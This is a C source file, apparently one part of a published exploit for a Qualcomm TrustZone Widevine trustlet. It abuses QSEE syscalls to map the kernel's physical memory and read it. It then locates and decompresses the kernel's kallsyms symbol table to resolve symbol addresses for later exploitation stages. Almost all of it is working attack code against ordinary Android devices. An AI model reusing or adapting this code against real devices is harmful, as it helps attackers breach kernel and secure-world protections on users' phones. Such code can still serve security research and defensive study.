#include "kallsyms.h"
#include "exploit_utilities.h"
#include "qsee_syscalls.h"
#include <stdio.h>
#include <asm/page.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>

/**
 * The physical address of the kernel's symbol table.
 */
uint32_t g_symbols_start = 0;

/**
 * The number of symbols.
 */
uint32_t g_num_symbols = 0;

/**
 * The start address of the kallsyms compressed names.
 */
uint32_t g_kallsyms_names_addr = 0;

/**
 * The token table containing each of the compression tokens.
 */
char* g_token_table[KALLSYMS_NUM_TOKENS];

/**
 * Whether or not the symbol table addresses have already been found.
 */
uint32_t g_initialized = 0;

int is_kernel_virt_address(uint32_t addr) {
	return (addr >= KERNEL_VIRT_ADDR) && (addr <= (KERNEL_VIRT_ADDR + KERNEL_SIZE));
}

int is_potential_symbol_table_page(struct qcom_wv_handle* handle, void* app, uint32_t off) {

	//Reading the first DWORD in the given offset
	uint32_t prev_val = read_dword(handle, app, KERNEL_PHYS_ADDR + off);
	if (!is_kernel_virt_address(prev_val))
		return 0;

	//Reading the rest of the DWORDs and making sure they are monotone kernel virtual addresses
	for (int i=1; i < SYMBOL_TABLE_DWORD_COUNT; i++) {
		uint32_t current_val = read_dword(handle, app, KERNEL_PHYS_ADDR + off + i*sizeof(uint32_t));
		if (!is_kernel_virt_address(current_val))
			return 0;
		if (current_val < prev_val)
			return 0;
		prev_val = current_val;
	}
	return 1;
}

int is_symbol_table(struct qcom_wv_handle* handle, void* app, uint32_t off) {
	for (int i=0; i < NUM_SYMBOL_TABLE_PAGES; i++)
		if (!is_potential_symbol_table_page(handle, app, off + i*PAGE_SIZE))
			return 0;
	return 1;
}

uint32_t next_label(uint32_t address) {
	if ((address & (LABEL_ALIGN-1)) == 0)
		return address + LABEL_ALIGN;
	else
		return (address + LABEL_ALIGN) & ~(LABEL_ALIGN-1);
}

int find_symbol_table_addresses(struct qcom_wv_handle* handle, void* app) {

	//Mapping in the kernel's addresses
    qsee_syscall(handle, app, QSEE_REGISTER_SHARED_BUF, KERNEL_PHYS_ADDR, KERNEL_SIZE, 0);
    qsee_syscall(handle, app, QSEE_PREPARE_SECURE_READ, KERNEL_PHYS_ADDR, KERNEL_SIZE, 0);

	//Searching for a series of increasing kernel pointers in at least two adjacent pages
	uint32_t approx_table_off = 0;
    for (uint32_t off = 0; off < KERNEL_CODE_SIZE; off += NUM_SYMBOL_TABLE_PAGES * PAGE_SIZE) {
		if (is_symbol_table(handle, app, off)) {		
			printf("[+] Found potential symbol table page at 0x%08X\n", KERNEL_PHYS_ADDR + off);
			approx_table_off = off;
			break;
		}
	}
	if (!approx_table_off) {
		printf("[-] Failed to find symbol table chunks\n");
		return -ENOENT;
	}

	//We found a potential table, scan backwards until we find the beginning
	for (uint32_t off = approx_table_off; off > 0; off -= sizeof(uint32_t)) {
		if (read_dword(handle, app, KERNEL_PHYS_ADDR + off) == KERNEL_VIRT_ADDR &&
			read_dword(handle, app, KERNEL_PHYS_ADDR + off + sizeof(uint32_t)) == KERNEL_VIRT_ADDR) {
			g_symbols_start = KERNEL_PHYS_ADDR + off;
			printf("[+] Found symbol table: 0x%08X\n", g_symbols_start);
			break;
		}
	}
	if (!g_symbols_start) {
		printf("[-] Failed to find symbol table start\n");
		return -ENOENT;
	}

	//Searching for the symbol table's end
	uint32_t symbol_table_end_off = g_symbols_start - KERNEL_PHYS_ADDR;
	while (is_symbol_table(handle, app, symbol_table_end_off))
		symbol_table_end_off += PAGE_SIZE;
	while (read_dword(handle, app, KERNEL_PHYS_ADDR + symbol_table_end_off) != 0)
		symbol_table_end_off += sizeof(uint32_t);	
	uint32_t symbol_table_end_addr = KERNEL_PHYS_ADDR + symbol_table_end_off;
	printf("[+] Symbol table end: 0x%08X\n", symbol_table_end_addr);

	//Reading the num_syms label
	uint32_t kallsyms_num_syms_addr = next_label(symbol_table_end_addr);
	g_num_symbols = read_dword(handle, app, kallsyms_num_syms_addr);
	printf("[+] Num symbols: 0x%08X\n", g_num_symbols);
	if (g_num_symbols != (symbol_table_end_addr - g_symbols_start)/sizeof(uint32_t)) {
		printf("[-] Mismatching number of symbols! Aborting.\n");
		return -EINVAL;
	}

	//Calculating the location of the markers offset
	g_kallsyms_names_addr = next_label(kallsyms_num_syms_addr);
	printf("[+] kallsyms_names: 0x%08X\n", g_kallsyms_names_addr);
	uint32_t current_addr = g_kallsyms_names_addr;
	for (int i=0; i<g_num_symbols; i++)
		current_addr += (read_dword(handle, app, current_addr) & 0xFF) + 1;
	uint32_t kallsyms_markers_addr = next_label(current_addr);
	printf("[+] kallsyms_markers: 0x%08X\n", kallsyms_markers_addr);

	//Reading the token table parameters
	uint32_t kallsyms_token_table_addr = next_label(kallsyms_markers_addr + (((g_num_symbols + (KALLSYMS_NUM_TOKENS-1)) >> 8) * sizeof(uint32_t)));
	printf("[+] kallsyms_token_table: 0x%08X\n", kallsyms_token_table_addr);
	current_addr = kallsyms_token_table_addr;
	for (int i=0; i<KALLSYMS_NUM_TOKENS; i++) {
		char* token_str = read_c_string(handle, app, current_addr);
		current_addr += strlen(token_str) + 1;
		free(token_str);
	}
	uint32_t kallsyms_token_index_addr = next_label(current_addr);
	printf("[+] kallsyms_token_index: 0x%08X\n", kallsyms_token_index_addr);

	//Creating the token table
	for (int i=0; i<KALLSYMS_NUM_TOKENS; i++) {
		uint32_t index = read_dword(handle, app, kallsyms_token_index_addr + i * sizeof(uint16_t)) & 0xFFFF;
		g_token_table[i] = read_c_string(handle, app, kallsyms_token_table_addr + index);
	}

	//Successfully found all symbols
	g_initialized = 1;
	return 0;
}


uint32_t kallsyms_lookup_name(struct qcom_wv_handle* handle, void* app, char* name) {

	//Making sure the addresses are loaded
	if (!g_initialized) {
		if (find_symbol_table_addresses(handle, app) != 0)
			return 0;
	}

	//Decompressing the symbol table using the token table
    uint32_t current_addr = g_kallsyms_names_addr;
	char symbol_name[MAX_SYMBOL_SIZE];
	for (int i=0; i<g_num_symbols; i++) {
        uint32_t num_tokens = read_dword(handle, app, current_addr) & 0xFF;
		current_addr++;
		symbol_name[0] = 0;
		for (int j=num_tokens; j>0; j--) {
			uint32_t token_table_idx = read_dword(handle, app, current_addr) & 0xFF;
			strcat(symbol_name, g_token_table[token_table_idx]);
			current_addr++;
		}
		if (strcmp(symbol_name+1, name) == 0) {
			return read_dword(handle, app, g_symbols_start + i*sizeof(uint32_t));
		}
		
	}
    return 0;
}
